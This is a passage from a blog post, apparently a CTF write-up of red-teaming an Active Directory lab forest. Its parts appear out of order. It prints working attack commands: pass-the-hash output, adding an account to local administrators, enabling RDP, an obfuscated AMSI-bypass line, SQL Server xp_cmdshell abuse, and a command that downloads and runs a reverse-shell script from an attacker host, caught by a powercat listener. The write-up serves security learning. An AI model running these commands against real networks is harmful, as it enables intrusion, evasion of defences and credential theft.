</span></span><span style="display:flex;"><span>  |  PID  <span style="color:#bd93f9">4428</span>
</span></span><span style="display:flex;"><span>  |  TID  <span style="color:#bd93f9">1292</span>
</span></span><span style="display:flex;"><span>  |  LSA Process is now R/W
</span></span><span style="display:flex;"><span>  |  LUID <span style="color:#bd93f9">0</span> ; <span style="color:#bd93f9">1820938</span> <span style="color:#ff79c6">(</span>00000000:001bc90a<span style="color:#ff79c6">)</span>
</span></span><span style="display:flex;"><span>  <span style="color:#f1fa8c">\_</span> msv1_0   - data copy @ 0000026480392C00 : OK !
</span></span><span style="display:flex;"><span>  <span style="color:#f1fa8c">\_</span> kerberos - data copy @ <span style="color:#bd93f9">0000026480082500</span>
</span></span><span style="display:flex;"><span>   <span style="color:#f1fa8c">\_</span> aes256_hmac       -&gt; null
</span></span><span style="display:flex;"><span>   <span style="color:#f1fa8c">\_</span> aes128_hmac       -&gt; null
</span></span><span style="display:flex;"><span>   <span style="color:#f1fa8c">\_</span> rc4_hmac_nt       OK
</span></span><span style="display:flex;"><span>   <span style="color:#f1fa8c">\_</span> rc4_hmac_old      OK
</span></span><span style="display:flex;"><span>   <span style="color:#f1fa8c">\_</span> rc4_md4           OK
</span></span><span style="display:flex;"><span>   <span style="color:#f1fa8c">\_</span> rc4_hmac_nt_exp   OK
</span></span><span style="display:flex;"><span>   <span style="color:#f1fa8c">\_</span> rc4_hmac_old_exp  OK
</span></span><span style="display:flex;"><span>   <span style="color:#f1fa8c">\_</span> *Password replace @ <span style="color:#bd93f9">0000026481000000</span> <span style="color:#ff79c6">(</span>32<span style="color:#ff79c6">)</span> -&gt; null
</span></span></code></pre></div><p>using the NTLM hash instead of the password to authenticate launches a new PowerShell process that runs with the <code>UATADMIN</code> credentials.</p>
<p>i can then add <code>bilal</code> to the local Administrators group on both the <code>UATADMIN</code> and <code>UATSRV</code> machines.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>PS C:<span style="color:#f1fa8c">\W</span>indows<span style="color:#f1fa8c">\s</span>ystem32&gt; <span style="color:#8be9fd;font-style:italic">$sess</span> <span style="color:#ff79c6">=</span> New-PSSession -ComputerName uatsrv.nebula.cosmos.local 
</span></span><span style="display:flex;"><span>PS C:<span style="color:#f1fa8c">\W</span>indows<span style="color:#f1fa8c">\s</span>ystem32&gt; Enter-PSSession -Session <span style="color:#8be9fd;font-style:italic">$sess</span> <span style="color:#ff79c6">[</span>uatsrv.nebula.cosmos.local<span style="color:#ff79c6">]</span>: PS C:<span style="color:#f1fa8c">\U</span>sers<span style="color:#f1fa8c">\u</span>atadmin<span style="color:#f1fa8c">\D</span>ocuments&gt; net localgroup administrators /add nebula<span style="color:#f1fa8c">\b</span>ilal 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>The <span style="color:#8be9fd;font-style:italic">command</span> completed successfully.
</span></span></code></pre></div><p>finally, let&rsquo;s enable RDP on the machine. i&rsquo;ll modify the Windows Registry to allow RDP connections, then enable the necessary firewall rule. this will give me GUI access to the machine, which could come in handy for further exploitation + exfiltration.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#ff79c6">[</span>uatsrv.nebula.cosmos.local<span style="color:#ff79c6">]</span>: PS C:<span style="color:#f1fa8c">\U</span>sers<span style="color:#f1fa8c">\u</span>atadmin<span style="color:#f1fa8c">\D</span>ocuments&gt; whoami;hostname nebula<span style="color:#f1fa8c">\u</span>atadmin
</span></span><span style="display:flex;"><span>uatsrv 
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>uatsrv.nebula.cosmos.local<span style="color:#ff79c6">]</span>: PS C:<span style="color:#f1fa8c">\U</span>sers<span style="color:#f1fa8c">\u</span>atadmin<span style="color:#f1fa8c">\D</span>ocuments&gt; Set-ItemProperty -Path <span style="color:#f1fa8c">&#39;HKLM:\System\CurrentControlSet\Control\Terminal Server&#39;</span> -name <span style="color:#f1fa8c">&#34;fDenyTSConnections&#34;</span> -Value <span style="color:#bd93f9">0</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>uatsrv.nebula.cosmos.local<span style="color:#ff79c6">]</span>: PS C:<span style="color:#f1fa8c">\U</span>sers<span style="color:#f1fa8c">\u</span>atadmin<span style="color:#f1fa8c">\D</span>ocuments&gt; Enable-NetFirewallRule -DisplayGroup <span style="color:#f1fa8c">&#34;Remote Desktop&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>uatsrv.nebula.cosmos.local<span style="color:#ff79c6">]</span>: PS C:<span style="color:#f1fa8c">\U</span>sers<span style="color:#f1fa8c">\u</span>atadmin<span style="color:#f1fa8c">\D</span>ocuments&gt; netsh advfirewall firewall add rule <span style="color:#8be9fd;font-style:italic">name</span><span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;allow RemoteDesktop&#34;</span> <span style="color:#8be9fd;font-style:italic">dir</span><span style="color:#ff79c6">=</span>in <span style="color:#8be9fd;font-style:italic">protocol</span><span style="color:#ff79c6">=</span>TCP <span style="color:#8be9fd;font-style:italic">localport</span><span style="color:#ff79c6">=</span><span style="color:#bd93f9">3389</span> <span style="color:#8be9fd;font-style:italic">action</span><span style="color:#ff79c6">=</span>allow 
</span></span><span style="display:flex;"><span>Ok.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">[</span>uatsrv.nebula.cosmos.local<span style="color:#ff79c6">]</span>: PS C:<span style="color:#f1fa8c">\U</span>sers<span style="color:#f1fa8c">\u</span>atadmin<span style="color:#f1fa8c">\D</span>ocuments&gt; Test-NetConnection 172.16.10.1 -CommonTCPPort rdp
</span></span></code></pre></div><h1 id="target-3-sql-server-exploitation">target 3: sql server exploitation</h1>
<p>this is a dev server that hosts critical database services. dev servers are used by engineers to build + test apps before moving them to production.</p>
<p>these environments usually contain valuable intellectual property (code) and have direct connections to production systems. let&rsquo;s look for more information the SQL Server setup. you can do this with <code>PowerUpSQL.ps1</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>PS C:<span style="color:#f1fa8c">\a</span>d<span style="color:#f1fa8c">\t</span>ools<span style="color:#f1fa8c">\P</span>owerUpSQL-master&gt;Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>VERBOSE: Creating runspace pool and session states
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>VERBOSE: devsrv.nebula.cosmos.local,1433 : Connection Success.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>VERBOSE: USER : Connection Failed.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>VERBOSE: Closing the runspace pool
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>ComputerName                    Instance                         Status
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>------------                    --------                         ------
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>devsrv.nebula.cosmos.local      devsrv.nebula.cosmos.local,1433  Accessible
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>USER                             USER                            Not Accessible
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>PS C:<span style="color:#f1fa8c">\a</span>d<span style="color:#f1fa8c">\t</span>ools<span style="color:#f1fa8c">\P</span>owerUpSQL-master&gt; Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>VERBOSE: devsrv.nebula.cosmos.local,1433 : Connection Success.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>ComputerName : devsrv.nebula.cosmos.local
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Instance : DEVSRV
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>DomainName : nebula
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>ServiceProcessID : <span style="color:#bd93f9">2576</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>ServiceName : MSSQLSERVER
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>ServiceAccount : nebula<span style="color:#f1fa8c">\d</span>evsqladmin
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>AuthenticationMode : Windows and SQL Server Authentication
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>ForcedEncryption : <span style="color:#bd93f9">0</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Clustered : No
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>SQLServerVersionNumber : 14.0.1000.169
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>SQLServerMajorVersion : <span style="color:#bd93f9">2017</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>SQLServerEdition : Developer Edition <span style="color:#ff79c6">(</span>64-bit<span style="color:#ff79c6">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>SQLServerServicePack : RTM
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>OSArchitecture : X64
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>OsMachineType : ServerNT
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>OSVersionName : Windows Server <span style="color:#bd93f9">2016</span> Standard
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>OsVersionNumber : SQL
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>CurrentLogin : nebula<span style="color:#f1fa8c">\u</span>atadmin
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>IsSysadmin : Yes
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>ActiveSessions : <span style="color:#bd93f9">1</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>PS C:<span style="color:#f1fa8c">\b</span>ilal<span style="color:#f1fa8c">\A</span>D&gt;  Get-SQLServerLinkCrawl -Instance devsrv.nebula.cosmos.local -Verbose
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>VERBOSE: devsrv.nebula.cosmos.local : Connection Success.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>VERBOSE: devsrv.nebula.cosmos.local : Connection Success.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>VERBOSE: ------------------------------------------
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>VERBOSE: Server: DEVSRV
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>VERBOSE: ------------------------------------------
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>VERBOSE: - Link Path to server: DEVSRV
</span></span></code></pre></div><p>luckily for me, i have sysadmin rights on this instance. meaning i can run OS commands, like <code>whoami</code> on the machine.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>PS C:<span style="color:#f1fa8c">\b</span>ilal<span style="color:#f1fa8c">\A</span>D&gt;  Invoke-SQLOSCmd -Instance devsrv.nebula.cosmos.local -Command whoami
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>ComputerName                 Instance                    CommandResults
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>------------                   --------                    ---------
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>devsrv.nebula.cosmos.local   devsrv.nebula.cosmos.local  nebula<span style="color:#f1fa8c">\d</span>evsqladmin
</span></span></code></pre></div><p>i&rsquo;m now going to build a backdoor into this instance. to do this, i&rsquo;ll set up a PowerCat listener and use a PowerShell reverse shell script.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>PS C:<span style="color:#f1fa8c">\b</span>ilal<span style="color:#f1fa8c">\A</span>D&gt; Get-SQLServerLinkCrawl -Instance devsrv.Nebula.Cosmos.local -Query <span style="color:#f1fa8c">&#39;exec master..xp_cmdshell &#34;powershell iex (New-Object Net.WebClient).DownloadString(&#39;&#39;http://172.16.10.1/Invoke-PowerShellTCP-reverse.ps1&#39;&#39;)&#34;&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>PS C:<span style="color:#f1fa8c">\b</span>ilal<span style="color:#f1fa8c">\A</span>D&gt; Invoke-SQLOSCmd -Instance devsrv.nebula.cosmos.local -Command <span style="color:#f1fa8c">&#34;powershell iex (New-Object Net.WebClient).DownloadString(&#39;http://172.16.10.1/Invoke-PowerShellTcp-reverse.ps1&#39;)&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>ComputerName Instance CommandResults
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>------------ -------- --------------
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>devsrv.nebula.cosmos.local devsrv.nebula.cosmos.local
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>PS C:<span style="color:#f1fa8c">\b</span>ilal<span style="color:#f1fa8c">\A</span>D&gt;  powercat -l -v -p <span style="color:#bd93f9">443</span> -t <span style="color:#bd93f9">555555</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>VERBOSE: Set Stream 1: TCP
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>VERBOSE: Set Stream 2: Console
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>VERBOSE: Setting up Stream 1...
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>VERBOSE: Listening on <span style="color:#ff79c6">[</span>0.0.0.0<span style="color:#ff79c6">]</span> <span style="color:#ff79c6">(</span>port 443<span style="color:#ff79c6">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>VERBOSE: Connection from <span style="color:#ff79c6">[</span>172.16.3.31<span style="color:#ff79c6">]</span> port <span style="color:#ff79c6">[</span>tcp<span style="color:#ff79c6">]</span> accepted <span style="color:#ff79c6">(</span><span style="color:#8be9fd;font-style:italic">source</span> port 49718<span style="color:#ff79c6">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>VERBOSE: Setting up Stream 2...
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>VERBOSE: Both Communication Streams Established. Redirecting Data Between Streams...
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Windows PowerShell running as user devsqladmin on DEVSRV
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Copyright <span style="color:#ff79c6">(</span>C<span style="color:#ff79c6">)</span> <span style="color:#bd93f9">2015</span> Microsoft Corporation. All rights reserved.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>PS C:<span style="color:#f1fa8c">\W</span>indows<span style="color:#f1fa8c">\s</span>ystem32&gt;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>PS C:<span style="color:#f1fa8c">\W</span>indows<span style="color:#f1fa8c">\s</span>ystem32&gt; PS C:<span style="color:#f1fa8c">\W</span>indows<span style="color:#f1fa8c">\s</span>ystem32&gt;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>PS C:<span style="color:#f1fa8c">\W</span>indows<span style="color:#f1fa8c">\s</span>ystem32&gt; whoami
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>nebula<span style="color:#f1fa8c">\d</span>evsqladmin
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>PS C:<span style="color:#f1fa8c">\W</span>indows<span style="color:#f1fa8c">\s</span>ystem32&gt;
</span></span></code></pre></div><p>the entire process is as follows:</p>
<p>exploit the SQL Server links to access other linked SQL Servers.</p>
<p>execute <code>xp_cmdshell</code>, which will allow me to execute OS commands.</p>
<p>download + execute a reverse shell script that will give me a reverse shell on <code>DEVSRV</code> as the <code>DEVSQLADMIN</code> user.</p>
<p>stay tuned for part 2, where i takeover the production server and domain controllers!</p>
</main>


    <br>
    <hr>
    
      Next: <a href="//localhost:1313/posts/new_post16/">goL0: reverse engineering &#43; malware analysis</a>
    




<footer>
  <div class="footer-nav">
    
    <a class="next" href="/posts/cosmos-2/" style="float: right"
      >next: cosmos, part 2: domain &#43; forest compromise</a
    >
     
    <a class="previous" href="/posts/new_post16/">previous</a>
    
  </div>
</footer>



<script defer>
  document.addEventListener("keydown", function (e) {
    if (document.activeElement.isContentEditable) {
      return false;
    }
    if (document.activeElement.tagName == "INPUT") {
      return false;
    }
    if (e.altKey || e.ctrlKey || e.shiftKey) {
      return false;
    }
    var key = e.key;
    if (key === "h") {
      e.preventDefault();
      e.stopPropagation();
      window.location.href = "/";
    } else if (key === "t") {
      e.preventDefault();
      e.stopPropagation();
      window.location.href = `https://${location.hostname}/tags`;
    } else if (key === "i") {
      e.preventDefault();
      e.stopPropagation();
      const inputs = document.querySelectorAll("input");
      for (let i = 0; i < inputs.length; i++) {
        if (inputs[i].offsetParent !== null) {
          inputs[i].selectionStart = inputs[i].selectionEnd =
            inputs[i].value.length;
          inputs[i].focus();
          break;
        }
      }
    }
    return false;
  });
</script>


<script defer>
  function throttle(fn, wait) {
    var time = Date.now();
    return function () {
      var now = Date.now()
      if (time + wait - now < 0) {
        fn();
        time = now;
      }
    };
  }

  function scrollHandler() {
    const anchors = Array.from(document.querySelectorAll("body h2, body h3"));

    function scrollCallback() {
      var scrollTop = window.pageYOffset || document.documentElement.scrollTop;

      
      for (var i = 0; i < anchors.length; i++) {
        var anchorId = anchors[i].getAttribute("id");
        var link = document.querySelector(
          'nav ul li a[href="#' + anchorId + '"]',
        );
        if (link) {
          link.classList.remove("active-toc");
        }
      }

      
      for (var i = anchors.length - 1; i >= 0; i--) {
        var offsetTop = anchors[i].offsetTop;
        if (scrollTop > offsetTop - 75) {
          var anchorId = anchors[i].getAttribute("id");
          var link = document.querySelector(
            'nav ul li a[href="#' + anchorId + '"]',
          );
          if (link) {
            link.classList.add("active-toc");
            break;
          }
        }
      }
    }

    window.addEventListener(
      "scroll",
      throttle(scrollCallback, 300),
    );
  }
  setTimeout(scrollHandler, 100);
</script>

<script defer>
  function addCopyButtonToCodeBlocks() {
    
    const codeBlocks = document.querySelectorAll('code[class^="language-"]');

    codeBlocks.forEach((codeBlock) => {
      const copyButton = document.createElement("button");
      copyButton.classList.add("copy-code-button");
      copyButton.innerHTML = "copy";

      
      copyButton.addEventListener("click", () => {
        
        const elements = codeBlock.querySelectorAll(".cl");
        let codeToCopy = "";
        elements.forEach((element) => {
          codeToCopy += element.innerText;
        });
        navigator.clipboard.writeText(codeToCopy);

        
        copyButton.innerHTML = "copied!";
        setTimeout(() => {
          copyButton.innerHTML = "copy";
        }, 1500);
      });

      
      codeBlock.parentNode.before(copyButton);
    });
  }
  setTimeout(function () {
    addCopyButtonToCodeBlocks();
  }, 100);
</script><!DOCTYPE html>
<html lang="en-us">
  <head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />

    <meta http-equiv="cache-control" content="max-age=0" />
    <meta http-equiv="cache-control" content="no-cache" />
    <meta http-equiv="expires" content="0" />
    <meta http-equiv="expires" content="Tue, 01 Jan 1980 1:00:00 GMT" />
    <meta http-equiv="pragma" content="no-cache" />

    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
    <link rel="manifest" href="/site.webmanifest">

    <meta name="theme-color" media="(prefers-color-scheme: light)" content="#ffffff" />
    <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#000000" />

    <meta name="description" content="cosmos, part 1: red-teaming corporate active directory forests">

    
        <title>cosmos, part 1: red-teaming corporate active directory forests | à¼§</title>
    

    
    <link rel="stylesheet" type="text/css" href="/style.min.6f40ec7b8baa6b4858deb6d2433606e0c74c60aa022d42f0d84457862cc005f3.css" media="all">
  </head>

  <body>
        
        <nav>
          <ul class="menu">
            
                <li><a tabindex="-1" class="menu-link" href="/about/">about</a></li>
            
                <li><a tabindex="-1" class="menu-link" href="/cv/">cv</a></li>
            
                <li><a tabindex="-1" class="menu-link" href="/posts/">posts</a></li>
            
                <li><a tabindex="-1" class="menu-link" href="/photography/">photography</a></li>
            
          </ul>
        </nav>
        



<div id="single-header">
  <h1>
    cosmos, part 1: red-teaming corporate active directory forests
  </h1>
  <div id="single-meta">
    
    
        <span class="datesub">jan 19, 2024 &nbsp;&nbsp; m. jan 19, 2024</span>
      

  </div>
</div>



<aside class="toc" id="tableOfContentContainer">
  <nav id="TableOfContents">
  <ul>
    <li><a href="#introduction"><strong>introduction</strong></a></li>
    <li><a href="#scenario"><strong>scenario</strong></a></li>
  </ul>

  <ul>
    <li><a href="#the-machines">the machines</a>
      <ul>
        <li><a href="#usernebulacosmoslocal"><code>User.Nebula.Cosmos.Local</code></a></li>
        <li><a href="#uatsrvnebulacosmoslocal"><code>Uatsrv.Nebula.Cosmos.Local</code></a></li>
        <li><a href="#devsrvnebulacosmoslocal"><code>Devsrv.Nebula.Cosmos.Local</code></a></li>
        <li><a href="#prodsrvnebulacosmoslocal"><code>Prodsrv.Nebula.Cosmos.Local</code></a></li>
        <li><a href="#nebula-dcnebulacosmoslocal"><code>Nebula-DC.Nebula.Cosmos.Local</code></a></li>
        <li><a href="#cosmos-dccosmoslocal"><code>Cosmos-DC.Cosmos.Local</code></a></li>
      </ul>
    </li>
    <li><a href="#attack-path">attack path</a></li>
  </ul>

  <ul>
    <li><a href="#initial-access--privilege-escalation">initial access + privilege escalation</a></li>
    <li><a href="#enumeration">enumeration</a></li>
  </ul>
</nav>
</aside>


<main><h2 id="introduction"><strong>introduction</strong></h2>
<p>corporate networks face a constant and ever-evolving array of threats. at the heart of many enterprise IT infrastructures lies Active Directory [AD]. this is a directory service developed by Microsoft that provides authentication (AuthC) and authorization (AuthZ) services. AD is ubiquitous because of its robust capabilities in managing users, groups, computers, and access to resources across large-scale networks.</p>
<p>this also makes it a prime target for attackers. a successful attack on an org&rsquo;s AD can lead to data breaches, intellectual property theft, or complete takeover of the corporate infrastructure.</p>
<p>red-teaming involves simulating real-world attacks on an org&rsquo;s systems + networks. for AD environments, this means compromising user accounts, escalating privileges, moving laterally through the network, and ultimately gaining control over domain controllers. by emulating TTPs of actual threat actors, red-teaming helps orgs identify vulnerabilities, test detection + response, and strengthen their security posture.</p>
<p>corporate AD environments are typically set up in a hierarchical structure, often spanning multiple domains and forests to reflect the org-structure of the business. this complexity, while necessary for large enterprises, can introduce vulnerabilities if not properly managed. misconfigurations, overly permissive settings, or failures to follow principles of least privilege can create opportunities for attackers to exploit.</p>
<p>the real kicker is that because AD has an interconnected nature, a compromise in one part of the network can potentially lead to a full domain (or even forest) takeover.</p>
<h2 id="scenario"><strong>scenario</strong></h2>
<p>the scenario here focuses on an on-prem AD environment. many organizations are now moving towards a fully cloud-based (or hybrid) environment, but on-prem AD remains prevalent in numerous enterprises due to regulatory requirements, legacy system dependencies, or specific business needs.</p>
<p>how would an attacker in this scenario gain their initial foothold? there are several ways in:</p>
<p><strong>phishing attacks</strong>: tricking employees into revealing credentials or executing malware.</p>
<p><strong>social engineering</strong>: manipulating employees to divulge sensitive information.</p>
<p><strong>exploiting external services</strong>: leveraging vulnerabilities in web apps, VPNs, or other services exposed to the internet.</p>
<p><strong>purchasing stolen credentials</strong>: gg ez.</p>
<p>in this CTF, everyone already starts with access to a user account, thereby circumventing the initial breach step. this means i can focus solely on the post-exploitation phase: escalate privileges and move laterally.</p>
<p>the attack chain demonstrates how a minor foothold can be leveraged to compromise an entire AD forest. hopefully, by sharing and understanding these attack paths, the security community can learn to better defend against them.</p>
<h1 id="the-forest">the forest</h1>
<p>the target environment is set up as an AD forest named <code>Cosmos.Local</code>. a forest is the highest level of organization in AD and can contain one or more domains.</p>
<p>in this case, we have two domains:</p>
<p><strong><code>Cosmos.Local</code></strong>: the parent domain.</p>
<p><strong><code>Nebula.Cosmos.Local</code></strong>: the child domain.</p>
<p>these domains are connected by a two-way trust relationship, also known as a &ldquo;parent-child trust&rdquo;. what this means is that the users from one domain can be granted access to resources in the other domain, and vice versa. these trust relationships are common in large orgs where different departments or subsidiaries need their own AD domains but still require a level of integration.</p>
<h2 id="the-machines">the machines</h2>
<h3 id="usernebulacosmoslocal"><code>User.Nebula.Cosmos.Local</code></h3>
<p><strong>role</strong>: end-user workstation (typical employee computer). initial point of entry which simulates a compromised user account.</p>
<p><strong>domain</strong>: <code>Nebula.Cosmos.Local</code></p>
<h3 id="uatsrvnebulacosmoslocal"><code>Uatsrv.Nebula.Cosmos.Local</code></h3>
<p><strong>role</strong>: UAT (User Acceptance Testing) Server. used for testing apps before they go into production. often has elevated privileges and looser security controls.</p>
<p><strong>domain</strong>: <code>Nebula.Cosmos.Local</code></p>
<h3 id="devsrvnebulacosmoslocal"><code>Devsrv.Nebula.Cosmos.Local</code></h3>
<p><strong>role</strong>: development server. hosts dev environments + tools. may contain valuable source code and often has connections to other critical systems.</p>
<p><strong>domain</strong>: <code>Nebula.Cosmos.Local</code></p>
<h3 id="prodsrvnebulacosmoslocal"><code>Prodsrv.Nebula.Cosmos.Local</code></h3>
<p><strong>role</strong>: production server. runs live business apps. critical asset with access to real data and often stringent security measures.</p>
<p><strong>domain</strong>: <code>Nebula.Cosmos.Local</code></p>
<h3 id="nebula-dcnebulacosmoslocal"><code>Nebula-DC.Nebula.Cosmos.Local</code></h3>
<p><strong>role</strong>: DC for <code>Nebula.Cosmos.Local</code>. manages AuthC + AuthZ for the Nebula child domain. prime target for attackers looking to control the entire child domain.</p>
<p><strong>domain</strong>: <code>Nebula.Cosmos.Local</code></p>
<h3 id="cosmos-dccosmoslocal"><code>Cosmos-DC.Cosmos.Local</code></h3>
<p><strong>role</strong>: DC for <code>Cosmos.Local</code> [Forest Root]. this is the ultimate target. as the forest root domain controller, it has authority over all domains in the forest. <strong>compromising this grants control over the entire AD infrastructure.</strong></p>
<h2 id="attack-path">attack path</h2>
<p>gain a foothold on the user workstation.</p>
<p>then, move laterally to the UAT and Dev servers, exploiting their looser security.</p>
<p>next, leverage access to compromise the production server.</p>
<p>abuse the production server&rsquo;s privileges to attack the <code>Nebula</code> domain controller.</p>
<p>finally, exploit the trust relationship to compromise the <code>Cosmos</code> domain controller and the entire forest.</p>
<h1 id="target-1-the-foothold">target 1: the foothold</h1>
<p>the seemingly innocuous user workstation is the entry point into the network. in a typical enterprise environment, these workstations are the most numerous and often considered low-hanging fruit for attackers. employees use them for daily tasks and so they&rsquo;re often less strictly controlled than servers.</p>
<p>the challenge is to elevate privileges and gather crucial information about the domain structure&hellip;without raising any alarms.</p>
<p>another thing about workstations: they often have vulnerabilities, outdated software, and misconfigurations. they can also be treasure troves of information, like cached credentials.</p>
<h2 id="initial-access--privilege-escalation">initial access + privilege escalation</h2>
<p>first, let&rsquo;s disable AMSI (Antimalware Scan Interface). AMSI is designed to prevent malicious scripts from running, so i&rsquo;ll have to write an obfuscated command to evade detection by signature-based security tools.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>PS C:<span style="color:#f1fa8c">\b</span>ilal<span style="color:#f1fa8c">\A</span>D&gt; sET-ItEM <span style="color:#ff79c6">(</span> <span style="color:#f1fa8c">&#39;V&#39;</span>+<span style="color:#f1fa8c">&#39;aR&#39;</span> + <span style="color:#f1fa8c">&#39;IA&#39;</span> + <span style="color:#f1fa8c">&#39;blE:1q2&#39;</span> + <span style="color:#f1fa8c">&#39;uZx&#39;</span> <span style="color:#ff79c6">)</span> <span style="color:#ff79c6">(</span> <span style="color:#ff79c6">[</span>TYpE<span style="color:#ff79c6">](</span><span style="color:#f1fa8c">&#34;{1}{0}&#34;</span>-F<span style="color:#f1fa8c">&#39;F&#39;</span>,<span style="color:#f1fa8c">&#39;rE&#39;</span> <span style="color:#ff79c6">)</span> <span style="color:#ff79c6">)</span> ; <span style="color:#ff79c6">(</span> GeT-VariaBle <span style="color:#ff79c6">(</span> <span style="color:#f1fa8c">&#34;1Q2U&#34;</span> +<span style="color:#f1fa8c">&#34;zX&#34;</span> <span style="color:#ff79c6">)</span> -VaL <span style="color:#ff79c6">)</span>.<span 